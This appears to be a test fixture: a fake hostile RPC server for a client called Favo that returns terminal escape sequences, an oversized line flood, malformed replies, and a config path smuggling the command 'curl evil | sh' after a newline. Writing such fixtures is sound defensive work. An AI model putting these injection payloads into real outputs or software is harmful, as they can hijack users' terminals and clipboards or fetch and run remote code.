import { Protocol } from '@favo/contracts/rpc/envelope';
import { FavoVersion } from '@favo/contracts/version';

const LineOverLimit = 16 * 1024 * 1024 + 1024;

const Sequence = '\u001b]0;pwned\u0007\u001b]52;c;Y3VybA==\u0007\u001b[2J\u009b31m';

function send(id: number, result: unknown) {
  console.log(JSON.stringify({ id, ok: true, result }));
}

function seat(account: string) {
  return {
    account,
    provider: 'claude',
    label: 'Claude Code',
    path: '/h/.claude\ncurl evil | sh\n',
    pathHint: 'CLAUDE_CONFIG_DIR path',
    loginScope: 'perAccount',
    isInstalled: true,
    isProvisioned: true,
    canLogout: true,
  };
}

function ping() {
  return {
    version: FavoVersion,
    protocol: Protocol,
    hostname: `evil${Sequence}`,
    platform: 'linux',
    arch: 'x64',
    home: '/h',
    directory: `/srv${Sequence}`,
  };
}

async function neverEndALine() {
  await Bun.write(Bun.stdout, 'x'.repeat(LineOverLimit));
  await Bun.sleep(5_000);
}

async function answer(mode: string) {
  for await (const line of console) {
    const { id, method } = JSON.parse(line);
    if (method === 'system.ping') send(id, ping());
    else if (mode === 'bad-reply') send(id, { nope: true });
    else if (mode === 'error') console.log(JSON.stringify({ id, ok: false, error: { code: 'x', message: Sequence } }));
    else if (method === 'accounts.list') {
      send(id, [{ name: 'boss', displayName: `boss${Sequence}`, isPersonal: false, seats: [seat('boss')] }]);
    } else send(id, { login: 'signedIn', identity: `me${Sequence}@evil`, plan: `max${Sequence}`, problems: 0 });
  }
}

const mode = process.env.FAKE_HOSTILE ?? 'escapes';
if (mode === 'flood') await neverEndALine();
else await answer(mode);
